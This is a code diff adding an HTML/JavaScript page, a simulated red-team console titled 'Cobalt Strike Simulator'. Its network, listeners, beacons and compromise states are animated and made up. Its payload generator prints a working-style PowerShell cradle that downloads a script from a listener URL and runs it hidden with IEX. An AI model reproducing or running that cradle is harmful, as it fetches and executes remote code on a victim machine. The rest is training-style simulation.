@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cobalt Strike Simulator</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: monospace;
+            display: flex;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Network visualization */
+        .network-container {
+            flex-grow: 1;
+            position: relative;
+            height: 100vh;
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
+        }
+        
+        .attacker {
+            width: 80px;
+            height: 80px;
+            background-color: red;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            box-shadow: 0 0 10px red;
+            position: absolute;
+            left: 50px;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 10;
+        }
+        
+        .device {
+            width: 60px;
+            height: 60px;
+            background-color: blue;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            position: absolute;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .selected {
+            outline: 3px solid yellow;
+        }
+        
+        .limited-compromise {
+            outline: 3px solid silver;
+        }
+        
+        .fully-compromised {
+            outline: 3px solid goldenrod;
+            background-color: darkred;
+        }
+        
+        .connection {
+            position: absolute;
+            height: 2px;
+            background-color: white;
+            transform-origin: left center;
+            z-index: 1;
+        }
+        
+        /* Beacon pulse animation */
+        @keyframes beaconPulse {
+            0% { box-shadow: 0 0 5px rgba(0, 255, 0, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(0, 255, 0, 1); }
+            100% { box-shadow: 0 0 5px rgba(0, 255, 0, 0.5); }
+        }
+        
+        .beacon-pulse {
+            animation: beaconPulse 2s infinite;
+        }
+        
+        /* Panels */
+        .state-panel {
+            width: 300px;
+            height: 100vh;
+            background: rgba(20, 20, 20, 0.9);
+            padding: 10px;
+            border-left: 2px solid #333;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .panel-section {
+            margin-bottom: 20px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        
+        .panel-section h3 {
+            margin-top: 0;
+            color: #4CAF50;
+        }
+        
+        /* CLI interface */
+        .cli-container {
+            position: fixed;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+        }
+        
+        .cli-input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            background: #111;
+            color: #0F0;
+            border: 1px solid #333;
+            font-family: monospace;
+            outline: none;
+        }
+        
+        .command-log {
+            position: fixed;
+            bottom: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 100px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 5px;
+            border: 1px solid #333;
+            font-size: 14px;
+        }
+        
+        /* Session and listener styling */
+        .session {
+            padding: 5px;
+            margin: 2px;
+            background: #222;
+            cursor: pointer;
+            border-left: 3px solid #333;
+        }
+        
+        .session.active {
+            background: #003300;
+            border-left: 3px solid #0F0;
+        }
+        
+        .listener-status {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        
+        .listener-indicator {
+            color: red;
+            font-weight: bold;
+        }
+        
+        .listener-indicator.active {
+            color: #0F0;
+        }
+        
+        button {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            margin: 2px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        
+        button:hover {
+            background: #444;
+        }
+        
+        /* Attack type specific styles */
+        .connection.http {
+            background-color: #3498db;
+        }
+        
+        .connection.https {
+            background-color: #2ecc71;
+        }
+        
+        .connection.dns {
+            background-color: #9b59b6;
+        }
+        
+        .connection.phishing {
+            border: 2px dashed pink;
+            background: repeating-linear-gradient(90deg, 
+                          transparent, 
+                          transparent 10px, 
+                          rgba(255,192,203,0.3) 10px, 
+                          rgba(255,192,203,0.3) 20px);
+        }
+        
+        .connection.ransomware {
+            background-color: #e74c3c;
+            animation: flashing 0.5s infinite;
+        }
+        
+        @keyframes flashing {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="network-container">
+        <div class="attacker" id="attacker">LocalHost</div>
+        <div class="device" id="device1" style="top: 200px; left: 200px;">device1</div>
+        <div class="device" id="device2" style="top: 100px; left: 400px;">device2</div>
+        <div class="device" id="device3" style="top: 300px; left: 400px;">device3</div>
+    </div>
+    
+    <div class="state-panel">
+        <div class="panel-section">
+            <h3>Device Information</h3>
+            <div id="device-info" class="device-info">Select a device to view details.</div>
+        </div>
+        
+        <div class="panel-section">
+            <h3>Listeners</h3>
+            <div class="listener-status">
+                <span>HTTP:</span>
+                <span id="http-status" class="listener-indicator">OFF</span>
+            </div>
+            <div class="listener-status">
+                <span>HTTPS:</span>
+                <span id="https-status" class="listener-indicator">OFF</span>
+            </div>
+            <div class="listener-status">
+                <span>DNS:</span>
+                <span id="dns-status" class="listener-indicator">OFF</span>
+            </div>
+            <button onclick="startListener('http')">Start HTTP</button>
+            <button onclick="startListener('https')">Start HTTPS</button>
+            <button onclick="stopAllListeners()">Stop All</button>
+        </div>
+        
+        <div class="panel-section">
+            <h3>Active Sessions</h3>
+            <div id="session-panel"></div>
+        </div>
+        
+        <div class="panel-section">
+            <h3>Beacon Console</h3>
+            <div id="current-beacon">No active beacon</div>
+            <div id="beacon-output" style="height: 100px; overflow-y: auto; background: #111; padding: 5px; margin: 5px 0;"></div>
+            <input type="text" id="beacon-cmd" placeholder="beacon> " style="width: 100%; padding: 5px; background: #111; color: white; border: 1px solid #333;">
+        </div>
+        
+        <div class="panel-section">
+            <h3>Payload Generator</h3>
+            <select id="payload-type">
+                <option value="exe">Windows EXE</option>
+                <option value="ps1">PowerShell</option>
+                <option value="macro">Office Macro</option>
+            </select>
+            <button onclick="generatePayload()">Generate</button>
+            <div id="payload-output" style="margin-top: 5px; word-break: break-all;"></div>
+        </div>
+    </div>
+    
+    <div class="command-log" id="command-log"></div>
+    
+    <div class="cli-container">
+        <input type="text" class="cli-input" id="cli" placeholder="Enter command..." autofocus>
+    </div>
+    
+    <script>
+        // Device metadata
+        let deviceMetadata = {
+            "device1": { name: "Router", ip: "192.168.1.1", os: "Cisco 3199 FPro Router", security: "Firewall Enabled" },
+            "device2": { name: "Term_1", ip: "192.168.20.10", os: "Windows Workstation", security: "AV Disabled" },
+            "device3": { name: "Serv_1", ip: "192.168.20.20", os: "Windows Server", security: "Firewall Enabled, IDS Active" },
+            "device4": { name: "Term_2", ip: "192.168.20.11", os: "Windows Workstation", security: "AV Disabled" },
+            "device5": { name: "Term_3", ip: "192.168.40.10", os: "Linux Workstation", security: "AV Disabled" },
+            "device6": { name: "Serv_2", ip: "192.168.20.21", os: "Windows Server", security: "Firewall Enabled, IDS Active" },
+            "device7": { name: "Switch_1", ip: "192.168.20.1", os: "Cisco AS440 Switch", security: "Host Based Access Control, AV" },
+            "device8": { name: "Switch_2", ip: "192.168.1.100", os: "Cisco AS440 Switch", security: "Host Based Access Control, AV" },
+            "device9": { name: "Serv_3", ip: "192.168.40.20", os: "Linux Server", security: "Firewall Enabled, IDS Active" },
+            "device10": { name: "Wireless AP", ip: "192.168.70.10", os: "Custom Firmware", security: "N/a" }
+        };
+
+        // Simulation state
+        let deviceStates = {};
+        let connections = [];
+        let selectedTarget = null;
+        let activeBeacon = null;
+        let attackerDevice = document.getElementById("attacker");
+        
+        // Listener system
+        let listeners = {
+            "http": { port: 80, active: false, devices: [] },
+            "https": { port: 443, active: false, devices: [] },
+            "dns": { port: 53, active: false, devices: [] }
+        };
+
+        // Initialize device states
+        document.querySelectorAll('.device').forEach(device => {
+            deviceStates[device.id] = {
+                compromiseLevel: "None",
+                lastCheckIn: null,
+                commands: [],
+                responses: [],
+                privileges: "user",
+                beaconActive: false
+            };
+        });
+
+        // CLI command processing
+        function processCommand(command) {
+            logCommand(`> ${command}`);
+            let parts = command.split(" ");
+            
+            // Set attacker
+            if (parts[0] === "set" && parts[1] === "attacker") {
+                setAttacker(parts[2]);
+            }
+            // Set target
+            else if (parts[0] === "set" && parts[1] === "target") {
+                setTarget(parts[2]);
+            }
+            // Attack commands
+            else if (parts[0] === "attack" && selectedTarget) {
+                executeAttack(parts.slice(1).join(" "));
+            }
+            // Listener commands
+            else if (parts[0] === "start" && parts[1] in listeners) {
+                startListener(parts[1]);
+            }
+            else if (parts[0] === "stop" && parts[1] in listeners) {
+                stopListener(parts[1]);
+            }
+            // Payload generation
+            else if (parts[0] === "generate") {
+                generatePayload(parts[1], parts[2]);
+            }
+            // Execute command on beacon
+            else if (parts[0] === "execute" && activeBeacon) {
+                executeBeaconCommand(command.substring(8));
+            }
+            // Scan device
+            else if (parts[0] === "scan") {
+                scanDevice(parts[1]);
+            }
+            // Help command
+            else if (command === "help") {
+                showHelp();
+            }
+            else {
+                logCommand("[!] Unknown command. Type 'help' for available commands.");
+            }
+        }
+
+        function setAttacker(deviceId) {
+            let newAttacker = document.getElementById(deviceId);
+            if (deviceId === "attacker") {
+                attackerDevice.classList.remove("selected");
+                attackerDevice.style.outline = "";
+                attackerDevice = document.getElementById("attacker");
+                attackerDevice.style.outline = "3px solid red";
+                logCommand("[+] Attacker reset to LocalHost.");
+            } 
+            else if (newAttacker && newAttacker.classList.contains("device")) {
+                attackerDevice.classList.remove("selected");
+                attackerDevice.style.outline = "";
+                attackerDevice = newAttacker;
+                attackerDevice.style.outline = "3px solid red";
+                logCommand(`[+] Attacker set to ${attackerDevice.textContent}`);
+            } 
+            else {
+                logCommand("[!] Invalid attacker device.");
+            }
+        }
+
+        function setTarget(deviceId) {
+            let newTarget = document.getElementById(deviceId);
+            if (newTarget && newTarget.classList.contains("device")) {
+                if (selectedTarget) selectedTarget.classList.remove("selected");
+                selectedTarget = newTarget;
+                selectedTarget.classList.add("selected");
+                updateDeviceInfo(selectedTarget.id);
+                logCommand(`[+] Target set to ${selectedTarget.textContent}`);
+            } 
+            else {
+                logCommand("[!] Invalid target device.");
+            }
+        }
+
+        function executeAttack(attackType) {
+    if (!selectedTarget) {
+        logCommand("[!] No target selected");
+        return;
+    }
+    
+    if (!attackerDevice) {
+        attackerDevice = document.getElementById("attacker");
+    }
+    
+    // Create visual connection
+    createConnection(attackerDevice, selectedTarget, attackType);
+            
+            // Create visual connection
+            createConnection(attackerDevice, selectedTarget, attackType);
+            
+            // Update device state
+            deviceStates[selectedTarget.id].compromiseLevel = "Limited";
+            deviceStates[selectedTarget.id].lastCheckIn = new Date();
+            selectedTarget.classList.add("limited-compromise");
+            
+            // Special effects based on attack type
+            switch(attackType.toLowerCase()) {
+                case "phishing":
+                    logCommand(`[+] Phishing attack sent to ${selectedTarget.textContent}`);
+                    setTimeout(() => {
+                        if (Math.random() > 0.3) { // 70% success rate
+                            escalateDevice(selectedTarget.id);
+                        }
+                    }, 3000);
+                    break;
+                case "ransomware":
+                    selectedTarget.classList.add("ransomware-effect");
+                    logCommand(`[+] Ransomware deployed to ${selectedTarget.textContent}`);
+                    break;
+                default:
+                    logCommand(`[+] ${attackType} attack executed on ${selectedTarget.textContent}`);
+            }
+            
+            updateSessions();
+        }
+
+        function createConnection(from, to, attackType) {
+    if (!from || !to) {
+        logCommand("[!] Invalid devices for connection");
+        return;
+    }
+            const container = document.querySelector(".network-container");
+            const line = document.createElement("div");
+            line.classList.add("connection", attackType.toLowerCase().replace(" ", "-"));
+            line.dataset.from = from.id;
+            line.dataset.to = to.id;
+            line.dataset.attackType = attackType;
+            
+            container.appendChild(line);
+            connections.push(line);
+            
+            const fromRect = from.getBoundingClientRect();
+            const toRect = to.getBoundingClientRect();
+            const containerRect = container.getBoundingClientRect();
+            
+            const x1 = fromRect.left + fromRect.width / 2 - containerRect.left;
+            const y1 = fromRect.top + fromRect.height / 2 - containerRect.top;
+            const x2 = toRect.left + toRect.width / 2 - containerRect.left;
+            const y2 = toRect.top + toRect.height / 2 - containerRect.top;
+            
+            const length = Math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2);
+            const angle = Math.atan2(y2 - y1, x2 - x1) * (180 / Math.PI);
+            
+            line.style.width = `${length}px`;
+            line.style.transform = `rotate(${angle}deg)`;
+            line.style.top = `${y1}px`;
+            line.style.left = `${x1}px`;
+        }
+
+        function startListener(type) {
+            if (listeners[type]) {
+                listeners[type].active = true;
+                document.getElementById(`${type}-status`).textContent = "ACTIVE";
+                document.getElementById(`${type}-status`).className = "listener-indicator active";
+                logCommand(`[+] ${type.toUpperCase()} listener started on port ${listeners[type].port}`);
+                
+                // Simulate periodic check-ins from compromised devices
+                setInterval(() => {
+                    Object.keys(deviceStates).forEach(deviceId => {
+                        if (deviceStates[deviceId].compromiseLevel !== "None" && 
+                            listeners[type].active && 
+                            Math.random() > 0.7) {
+                            checkIn(deviceId, type);
+                        }
+                    });
+                }, 5000);
+            }
+        }
+
+        function stopListener(type) {
+            if (listeners[type]) {
+                listeners[type].active = false;
+                document.getElementById(`${type}-status`).textContent = "OFF";
+                document.getElementById(`${type}-status`).className = "listener-indicator";
+                logCommand(`[+] ${type.toUpperCase()} listener stopped`);
+            }
+        }
+
+        function stopAllListeners() {
+            Object.keys(listeners).forEach(type => stopListener(type));
+        }
+
+        function checkIn(deviceId, listenerType) {
+            const device = document.getElementById(deviceId);
+            if (device) {
+                device.classList.add('beacon-pulse');
+                setTimeout(() => {
+                    device.classList.remove('beacon-pulse');
+                }, 2000);
+                
+                logCommand(`[+] ${deviceId} checked in via ${listenerType.toUpperCase()}`);
+                deviceStates[deviceId].lastCheckIn = new Date();
+                
+                if (deviceStates[deviceId].commands.length > 0) {
+                    const cmd = deviceStates[deviceId].commands.shift();
+                    const response = simulateCommandExecution(cmd, deviceId);
+                    deviceStates[deviceId].responses.push(response);
+                    
+                    if (deviceId === activeBeacon) {
+                        const beaconOutput = document.getElementById('beacon-output');
+                        beaconOutput.innerHTML += `<div>${response}</div>`;
+                        beaconOutput.scrollTop = beaconOutput.scrollHeight;
+                    }
+                }
+            }
+        }
+
+        function generatePayload(type, listener) {
+            if (!type) type = document.getElementById('payload-type').value;
+            
+            const activeListeners = Object.keys(listeners).filter(l => listeners[l].active);
+            if (activeListeners.length === 0) {
+                logCommand("[!] No active listeners to generate payload for");
+                return;
+            }
+            
+            listener = listener || activeListeners[0];
+            
+            const payloads = {
+                "exe": `https://${listener}/payload.exe`,
+                "ps1": `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://${listener}/payload.ps1')"`,
+                "macro": `Sub AutoOpen()\n    ExecutePayload\nEnd Sub\n' Paste into Word doc`
+            };
+            
+            if (payloads[type]) {
+                const payloadOutput = document.getElementById('payload-output');
+                payloadOutput.textContent = payloads[type];
+                logCommand(`[+] Generated ${type} payload for ${listener} listener`);
+            } else {
+                logCommand("[!] Invalid payload type");
+            }
+        }
+
+        function executeBeaconCommand(cmd) {
+            if (!activeBeacon) {
+                logCommand("[!] No active beacon selected");
+                return;
+            }
+            
+            deviceStates[activeBeacon].commands.push(cmd);
+            logCommand(`[+] Command queued for ${activeBeacon}: ${cmd}`);
+            
+            const beaconOutput = document.getElementById('beacon-output');
+            beaconOutput.innerHTML += `<div><strong>> ${cmd}</strong></div>`;
+            beaconOutput.scrollTop = beaconOutput.scrollHeight;
+        }
+
+        function simulateCommandExecution(cmd, deviceId) {
+            const meta = deviceMetadata[deviceId];
+            const isWindows = meta.os.includes("Windows");
+            
+            if (cmd === "whoami") {
+                return isWindows ? "nt authority\\system" : "root";
+            } 
+            else if (cmd === "ipconfig" || cmd === "ifconfig") {
+                return isWindows 
+                    ? `IPv4 Address: ${meta.ip}\nSubnet Mask: 255.255.255.0` 
+                    : `inet ${meta.ip} netmask 0xffffff00`;
+            } 
+            else if (cmd.startsWith("download ")) {
+                return `[+] Downloaded ${cmd.substring(9)} (simulated)`;
+            }
+            else if (cmd.startsWith("upload ")) {
+                return `[+] Uploaded ${cmd.substring(7)} (simulated)`;
+            }
+            else if (cmd === "screenshot") {
+                return `[+] Captured screenshot (simulated)`;
+            }
+            else {
+                return `Command output simulated for ${cmd}`;
+            }
+        }
+
+        function escalateDevice(deviceId) {
+            let device = document.getElementById(deviceId);
+            if (device && deviceStates[deviceId]) {
+                deviceStates[deviceId].compromiseLevel = "Fully Compromised";
+                deviceStates[deviceId].privileges = "system";
+                device.classList.remove("limited-compromise");
+                device.classList.add("fully-compromised");
+                
+                logCommand(`[+] ${deviceId} is now fully compromised`);
+                updateSessions();
+            }
+        }
+
+        function updateDeviceInfo(deviceId) {
+            let infoPanel = document.getElementById("device-info");
+            let device = deviceMetadata[deviceId];
+            if (device) {
+                infoPanel.innerHTML = `
+                    <strong>${device.name}</strong><br>
+                    IP: ${device.ip}<br>
+                    OS: ${device.os}<br>
+                    Security: ${device.security}<br>
+                    Status: ${deviceStates[deviceId]?.compromiseLevel || "Not Compromised"}
+                `;
+            }
+        }
+
+        function updateSessions() {
+            const sessionPanel = document.getElementById('session-panel');
+            sessionPanel.innerHTML = '';
+            
+            Object.keys(deviceStates).forEach(deviceId => {
+                if (deviceStates[deviceId].compromiseLevel === "Fully Compromised") {
+                    const sessionDiv = document.createElement('div');
+                    sessionDiv.className = 'session';
+                    sessionDiv.dataset.id = deviceId;
+                    sessionDiv.textContent = `${deviceId} (${deviceMetadata[deviceId].os})`;
+                    sessionDiv.onclick = () => {
+                        document.querySelectorAll('.session').forEach(s => s.classList.remove('active'));
+                        sessionDiv.classList.add('active');
+                        activeBeacon = deviceId;
+                        document.getElementById('current-beacon').textContent = deviceId;
+                        
+                        // Show command history
+                        const beaconOutput = document.getElementById('beacon-output');
+                        beaconOutput.innerHTML = deviceStates[deviceId].responses
+                            .map(r => `<div>${r}</div>`)
+                            .join('');
+                        beaconOutput.scrollTop = beaconOutput.scrollHeight;
+                    };
+                    sessionPanel.appendChild(sessionDiv);
+                }
+            });
+        }
+
+        function scanDevice(deviceId) {
+            const device = document.getElementById(deviceId);
+            if (device) {
+                updateDeviceInfo(deviceId);
+                logCommand(`[+] Scan results for ${deviceId}:`);
+                logCommand(`OS: ${deviceMetadata[deviceId].os}`);
+                logCommand(`IP: ${deviceMetadata[deviceId].ip}`);
+                logCommand(`Security: ${deviceMetadata[deviceId].security}`);
+                
+                // Pulse effect for visual feedback
+                device.classList.add('beacon-pulse');
+                setTimeout(() => device.classList.remove('beacon-pulse'), 1000);
+            } 
+            else {
+                logCommand(`[!] Device ${deviceId} not found`);
+            }
+        }
+
+        function showHelp() {
+            logCommand("Available commands:");
+            logCommand("  set attacker [device] - Set attacker device");
+            logCommand("  set target [device] - Set target device");
+            logCommand("  attack [type] - Execute attack on target");
+            logCommand("  start [http/https/dns] - Start listener");
+            logCommand("  stop [http/https/dns] - Stop listener");
+            logCommand("  generate [type] - Generate payload");
+            logCommand("  execute [command] - Run command on beacon");
+            logCommand("  scan [device] - Scan target device");
+        }
+
+        function logCommand(message) {
+            let log = document.getElementById("command-log");
+            let entry = document.createElement("div");
+            entry.textContent = message;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        // Initialize event listeners
+        document.addEventListener("DOMContentLoaded", function() {
+            // CLI input
+            document.getElementById("cli").addEventListener("keydown", function(e) {
+                if (e.key === "Enter") {
+                    processCommand(this.value.trim());
+                    this.value = "";
+                }
+            });
+            
+            // Beacon command input
+            document.getElementById("beacon-cmd").addEventListener("keydown", function(e) {
+                if (e.key === "Enter") {
+                    executeBeaconCommand(this.value.trim());
+                    this.value = "";
+                }
+            });
+            
+            // Device click handlers
+            document.querySelectorAll(".device").forEach(device => {
+                device.addEventListener("click", () => {
+                    updateDeviceInfo(device.id);
+                });
+            });
+            
+            // Initial log message
+            logCommand("Cobalt Strike Simulator initialized");
+            logCommand("Type 'help' for available commands");
+        });
+    </script>
+</body>
+</html>
